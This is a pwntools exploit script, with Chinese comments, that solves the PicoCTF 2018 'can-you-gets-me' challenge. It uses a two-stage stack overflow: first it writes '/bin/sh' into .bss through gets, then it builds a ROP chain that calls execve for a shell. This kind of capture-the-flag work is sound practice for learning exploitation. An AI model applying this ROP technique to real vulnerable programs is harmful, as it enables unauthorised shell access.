from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('./PicoCTF_2018_can-you-gets-me')

int_0x80_list = [0x0806cc25, 0x0806f630, 0x0806a9d5, 0x0806a9de] #: int 0x80
int80 = int_0x80_list[0]
peax = 0x080b81c6 #: pop eax ; ret                     # gadget1
pppr = 0x0806f050 #: pop edx ; pop ecx ; pop ebx ; ret # gadget2

gets = 0x0804f120
bss = elf.get_section_by_name('.bss').header.sh_addr + 0x500 # bss段中的某个地址，用于注射字符串/bin/sh
log.success(hex(bss))
main = 0x080488A3

io = process('./PicoCTF_2018_can-you-gets-me')


# 1. 第一次栈溢出，通过调用gets函数向程序的bss段中注射字符串/bin/sh
io.recvuntil('GIVE ME YOUR NAME!\n')
payload = b'a' * 24 + b'bbbb'
payload += p32(gets) + p32(main) + p32(bss) # 返回地址置为main函数，便于第二次栈溢出获得shell
io.sendline(payload)

io.sendline('/bin/sh')

# 2. 第二次栈溢出，通过execve系统调用获得shell
io.recvuntil('GIVE ME YOUR NAME!\n')
payload = b'a' * 24 + b'bbbb'
payload += p32(pppr) + p32(0) + p32(0) + p32(bss) # 插入gadget2，将edx和ecx置为0，ebx置为字符串/bin/sh的地址
payload += p32(peax) + p32(0xb) # 插入gadget1，将eax置为0xb，表示execve系统调用
payload += p32(int80) # 相当于执行execve("/bin/sh", NULL, NULL);

gdb.attach(io)
io.sendline(payload)

io.interactive()
